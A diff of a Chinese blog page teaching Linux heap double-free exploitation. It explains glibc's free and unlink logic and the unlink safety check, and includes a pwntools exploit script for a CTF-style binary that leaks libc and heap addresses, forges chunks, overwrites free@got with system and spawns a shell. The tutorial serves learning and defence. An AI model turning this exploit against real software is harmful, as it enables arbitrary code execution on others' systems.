class="number">0x602018</span></span><br><span class="line">    <span class="comment"># 1.leak glibc address,then caculate system and &#x27;/bin/sh&#x27; address</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    list_post()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># arena_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    leak_a = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    arena_addr = u64(leak_a[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        system_addr = arena_addr - (<span class="number">0x3c3b68</span> - <span class="number">0x45380</span>) <span class="comment">#local offset</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        system_addr = arena_addr - (<span class="number">0x3be7b8</span> - <span class="number">0x46590</span>) <span class="comment">#remote offset</span></span><br><span class="line">    <span class="comment"># print &#x27;system_adddr %x&#x27; % system_addr    </span></span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.leak heap chunk base</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">2</span>)</span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    edit_post(<span class="number">1</span>, <span class="number">0x98</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x97</span>)</span><br><span class="line">    list_post()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1. AA&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    leak = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    heap_addr = u64(leak[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># print &#x27;heap base %x&#x27; % heap_addr</span></span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line">    delete_post(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.construct fake heap</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    fake_pre_size = <span class="number">0xa1</span></span><br><span class="line">    fake_size = <span class="number">0x81</span></span><br><span class="line">    fd = heap_addr - <span class="number">0x17f0</span> - <span class="number">0x18</span></span><br><span class="line">    bk = heap_addr - <span class="number">0x17f0</span> - <span class="number">0x10</span></span><br><span class="line">    payload1 = p64(fake_pre_size) + p64(fake_size) + p64(fd) + p64(bk)</span><br><span class="line">    payload1 += <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0xa0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;A&#x27;</span> *<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line"></span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x91</span>, payload1)</span><br><span class="line">    edit_post(<span class="number">2</span>, <span class="number">0x31</span>, payload2)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. overwrite free@got</span></span><br><span class="line">    payload3 = p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>) + p64(free_got)</span><br><span class="line">    payload3 += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    payload3 += p64(<span class="number">1</span>)+ p64(<span class="number">0x8</span>) + p64(heap_addr - <span class="number">0x17b8</span>) + <span class="string">&#x27;/bin/sh\n&#x27;</span></span><br><span class="line">    payload3 = payload3.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x91</span>, payload3)</span><br><span class="line">    <span class="comment"># raw_input(&#x27;system(binsh)&#x27;)</span></span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x8</span>, p64(system_addr))</span><br><span class="line">    delete_post(<span class="number">2</span>)    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p>
-<h3 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04.　参考文献"></a>0x04.　参考文献</h3><p><a target="_blank" rel="noopener" href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916642.220000NaN1.1.JLYyhU&amp;articleid=360">1. Linux堆溢出漏洞利用之unlink</a><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/binary/10638">2. 一步一步学ROP之gadgets和2free篇</a></p>
-
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/PWN/" rel="tag"># PWN</a>
-          </div>
-
         
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2017/02/17/PWN/Linux%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bfastbin%E5%AE%9E%E4%BE%8B/" rel="prev" title="Linux堆溢出之fastbin实例">
-      <i class="fa fa-chevron-left"></i> Linux堆溢出之fastbin实例
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2017/03/01/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8Boff-by-one/" rel="next" title="Linux堆漏洞之off-by-one">
-      Linux堆漏洞之off-by-one <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
   
-  
-  
-
-
-
-          </div>
-          
-    
-  
-  <div class="comments">
-  <script src="https://utteranc.es/client.js" repo="D0m021ng/D0m021ng.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>
-  </div>
-  
-  
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
 
   <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
         </li>
@@ -318,35 +113,33 @@
         </li>
       </ul>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00.　前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Glibc%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01.　Glibc背景知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Double-free%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">0x02.　Double free漏洞利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Double-free%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.</span> <span class="nav-text">0x03.　Double free漏洞利用实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">5.</span> <span class="nav-text">0x04.　参考文献</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00.　前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Glibc%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01.　Glibc背景知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Double-free%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">0x02.　Double free漏洞利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Double-free%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.</span> <span class="nav-text">0x03.　Double free漏洞利用实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">5.</span> <span class="nav-text">0x04.　参考文献</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
   <p class="site-author-name" itemprop="name">D0m021ng</p>
   <div class="site-description" itemprop="description"></div>
 </div>
-<div class="site-state-wrap motion-element">
+<div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
+        <a href="/archives/">
           <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
+          <a href="/categories/">
         <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
+          <a href="/tags/">
         <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
@@ -355,42 +148,169 @@
 
 
 
+        </div>
       </div>
-
     </div>
   </aside>
-  <div id="sidebar-dimmer"></div>
+  <div class="sidebar-dimmer"></div>
 
 
-      </div>
-    </main>
+    </header>
 
-    <footer class="footer">
-      <div class="footer-inner">
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="D0m021ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不要说话">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Linux堆漏洞之Double free | 不要说话">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux堆漏洞之Double free
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-02-24 11:19:12" itemprop="dateCreated datePublished" datetime="2017-02-24T11:19:12+00:00">2017-02-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2017-03-02 00:47:16" itemprop="dateModified" datetime="2017-03-02T00:47:16+00:00">2017-03-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.　前言"></a>0x00.　前言</h3><p>很久之前学习了Linux堆漏洞Double free，一直没时间写下学习体会。今天有时间记录下，如有错误，欢迎斧正。本文主要介绍Linux下堆漏洞Double free的利用原理与实践。所谓的Double free是指：同一个指针指向的内存被free两次。</p>
+<h3 id="0x01-Glibc背景知识"><a href="#0x01-Glibc背景知识" class="headerlink" title="0x01.　Glibc背景知识"></a>0x01.　Glibc背景知识</h3><p>Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</p>
+<p><strong>Double free漏洞原理：</strong> free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</p>
+<p><strong>Linux free函数原理</strong><br>由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：<em>前一个块</em>（由当前块头指针加pre_size确定），<em>后一个块</em>（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：<em>向后合并</em>、<em>向前合并</em>。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。<br><em>相关代码</em><br>    malloc.c int_free函数中相关代码如下：<br>    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char \*) (p)) + (s)))</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char \*) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">/* consolidate backward \*/</span>                    <span class="comment">// &quot;向后合并&quot;</span></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;                           <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">       prevsize = p-&gt;prev_size;                      <span class="comment">//获得前一个块大小</span></span><br><span class="line">       size += prevsize;                             <span class="comment">//合并后堆块大小</span></span><br><span class="line">       p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));   <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">       unlink(av, p, bck, fwd);                      <span class="comment">//利用unlink从显式链表Unsorted bin取下前一个块</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      nextchunk = chunk_at_offset(p, size);                 <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">      nextsize = chunksize(nextchunk);                      <span class="comment">//获得后一个块大小</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line">      <span class="comment">/* consolidate forward \*/</span>                <span class="comment">// &quot;向前合并&quot;</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;                          <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">       unlink(av, nextchunk, bck, fwd);         <span class="comment">//使用unlink将后一个块从unsorted bin中取下</span></span><br><span class="line">       size += nextsize;                        <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">     clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  unlink 宏中主要的操作如下:</span><br><span class="line">  注意：此处的fd、bk指的是显式链表bins中的前一个块和后一个块，与合并块时的隐式链表中的前一个块和后一个块不同</span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">      FD = P-&gt;fd;   <span class="comment">//获取显式链表中前一个块 FD					      </span></span><br><span class="line">      BK = P-&gt;bk;   <span class="comment">//获取显示链表中后一个块 BK              </span></span><br><span class="line">      FD-&gt;bk = BK;  <span class="comment">//设置FD的后一个块					      </span></span><br><span class="line">      BK-&gt;fd = FD;  <span class="comment">//设置BK的前一个块</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下</span></span><br><span class="line">  <span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">      FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">      BK = P-&gt;bk;								      </span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line">      <span class="keyword">else</span> &#123;								      \</span><br><span class="line">          FD-&gt;bk = BK;							      \</span><br><span class="line">          BK-&gt;fd = FD;							      \</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">              &amp;&amp;__builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">  	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">  		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">  	      malloc_printerr (check_action,				      \</span><br><span class="line">  			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">  			       P, AV);					      \</span><br><span class="line">              <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                  <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                  <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                      FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                      FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                      P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                      P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                    &#125;							      \</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                  P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                  P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">                &#125;								      \</span><br><span class="line">            &#125;								      \</span><br><span class="line">        &#125;									      \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-Double-free漏洞利用原理"><a href="#0x02-Double-free漏洞利用原理" class="headerlink" title="0x02.　Double free漏洞利用原理"></a>0x02.　Double free漏洞利用原理</h3><p>以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式:<br> <strong>fake_prevsize1 &#x3D; 被释放块大小；</strong><br> <strong>fake_size1 &#x3D; 0x20 | 1  (fake_size1 &#x3D; 0x20)</strong><br> <strong>fake_fd &#x3D; <a href="mailto:&#x66;&#114;&#101;&#101;&#64;&#103;&#111;&#116;&#x2e;&#x70;&#108;&#116;">&#x66;&#114;&#101;&#101;&#64;&#103;&#111;&#116;&#x2e;&#x70;&#108;&#116;</a> - 0x18</strong><br> <strong>fake_bk &#x3D; shellcode address</strong><br> <strong>fake_prevsize2 &#x3D; 0x20</strong><br> <strong>fake_size2 &#x3D; 0x10</strong><br>如下图:<br><strong>如果chunk0被释放(fake_size1 &#x3D; 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</strong><br><strong>如果chunk1被释放(fake_size1 &#x3D; 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</strong><br><strong>根据unlink宏知道</strong>， 前一个块 FD 指向 <a href="mailto:&#x66;&#x72;&#x65;&#101;&#x40;&#x67;&#111;&#116;&#46;&#x70;&#108;&#116;">&#x66;&#x72;&#x65;&#101;&#x40;&#x67;&#111;&#116;&#46;&#x70;&#108;&#116;</a> - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即<a href="mailto:&#102;&#x72;&#101;&#101;&#64;&#103;&#x6f;&#116;&#x2e;&#x70;&#108;&#116;">&#102;&#x72;&#101;&#101;&#64;&#103;&#x6f;&#116;&#x2e;&#x70;&#108;&#116;</a>，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode + 0x10，值为 <a href="mailto:&#102;&#114;&#x65;&#101;&#x40;&#x67;&#x6f;&#116;&#x2e;&#112;&#108;&#x74;">&#102;&#114;&#x65;&#101;&#x40;&#x67;&#x6f;&#116;&#x2e;&#112;&#108;&#x74;</a>。从而实现了一次固定地址写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">High    |----------------|</span><br><span class="line">        |   fake_size2   |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize2 |</span><br><span class="line">        |----------------|  chunk2 pointer</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk1 <span class="built_in">malloc</span> returned pointer</span><br><span class="line">        |  fake_size1    |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize1 |</span><br><span class="line">        |----------------|  chunk1 pointer</span><br><span class="line">        |     ......     |</span><br><span class="line">        |    padding     |</span><br><span class="line">        |     ......     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk0 <span class="built_in">malloc</span> returned pointer</span><br><span class="line">        |     size       |</span><br><span class="line">        |----------------|</span><br><span class="line">        |   prev_size    |</span><br><span class="line">Low     |----------------|  chunk0 pointer</span><br></pre></td></tr></table></figure>
+
+<p>但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">   malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV)</span><br></pre></td></tr></table></figure>
+<p>针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</p>
